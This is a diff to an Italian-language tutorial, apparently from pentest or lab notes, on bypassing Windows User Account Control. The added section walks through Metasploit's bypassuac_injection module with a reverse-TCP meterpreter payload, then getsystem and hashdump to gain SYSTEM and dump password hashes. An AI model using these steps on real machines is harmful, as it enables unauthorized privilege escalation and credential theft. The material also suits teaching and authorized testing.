@@ -3,7 +3,8 @@
 
 ## Cos’è l’UAC?
 
-**UAC (User Account Control)** è una funzionalità di sicurezza introdotta con Windows Vista e mantenuta in tutte le versioni successive. Il suo obiettivo è impedire che software non autorizzati (inclusi malware) apportino modifiche critiche al sistema operativo senza il consenso esplicito dell’utente.
+**UAC (User Account Control)** è una funzionalità di sicurezza introdotta con Windows Vista e mantenuta in tutte le versioni successive. <br>
+Il suo obiettivo è impedire che software non autorizzati (inclusi malware) apportino modifiche critiche al sistema operativo senza il consenso esplicito dell’utente.
 
 Quando un programma richiede privilegi elevati:
 
@@ -95,5 +96,29 @@ Una volta che il payload viene eseguito con privilegi elevati, otterremo una nuo
 `ps` ⟶ mostra i processi attivi per poter eventualmente migrare in un altro processo di sistema. <br>
 
 Se tutto è andato a buon fine, abbiamo bypassato l’UAC ottenendo controllo SYSTEM.
+
+---
+
+## Utilizzo modulo automatico Metasploit
+Esiste un modulo per poter bypassare UAC ed effettuare varie tecniche di privilege escalation, 
+```bash
+use exploit/windows/local/bypassuac_injection
+set payload windows/x64/meterpeter/reverse_tcp    # se il target ha un sistema operativo 64 bit
+set SESSION 1
+set LPORT <PORT>                                  # se la sessione meterpeter usa la porta 4444 va messa una porta differente
+run
+```
+dopo aver eseguito questo modulo, otterremo una seconda sessione con UAC bypassato e verrano date delle informazioni sul target. <br>
+se dovesse fallire, basta impostare il tipo di target
+```bash
+set TARGET Windows\ x64       # se il target ha un sistema operativo 64 bit, altrimenti completare premendo TAB con il sistema operativo corretto
+```
+possiamo successivamente fare 
+```bash
+sysinfo
+getuid
+getsystem    # per elevare automaticamente i privilegi
+hashdump 
+```
 
 ---
